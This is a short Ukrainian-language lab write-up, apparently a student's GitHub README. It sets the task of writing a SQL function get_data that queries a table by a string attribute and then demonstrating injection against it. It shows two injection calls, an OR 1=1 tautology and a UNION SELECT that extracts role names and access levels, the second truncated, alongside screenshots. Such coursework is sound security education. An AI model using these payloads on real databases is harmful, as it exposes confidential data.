#### Створити функцію get_data по отриманню рядків таблиці на основі SQL-запиту з використанням атрибуту строкового типу, наприклад: SELECT * FROM ТАБЛИЦЯ WHERE АТРИБУТ = 'ЗНАЧЕННЯ'

Вхідним параметром функції є вказаний атрибут.
Розмістити функцію у файлі get_data.sql у GitHub-репозиторії.
#### Створити виклики функції з SQL-ін'єкціями по порушенню конфіденційності даних, приклади яких представлені в теоретичних відомостях.
Створити знімки екранів з результатами виконання викликів функції та розмітити їх у файлі get_data_results.md у GitHub-репозиторії.

![image](https://user-images.githubusercontent.com/56130345/206292311-d7cabea4-2309-465c-a0a4-17f5fac28732.png)

` SELECT * FROM get_data('1'' OR 1=1 -- '); `

![image](https://user-images.githubusercontent.com/56130345/206292226-a42a9f7d-5cc9-483d-ac42-954106459db4.png)

` SELECT * FROM get_data('1'' UNION SELECT CAST(NULL AS INTEGER), CAST(role_name AS VARCHAR), CAST(access_level AS INTEGER) FR `

![image](https://user-images.githubusercontent.com/56130345/206292496-d250bdaf-9773-4d84-a1e0-357b4481950a.png)
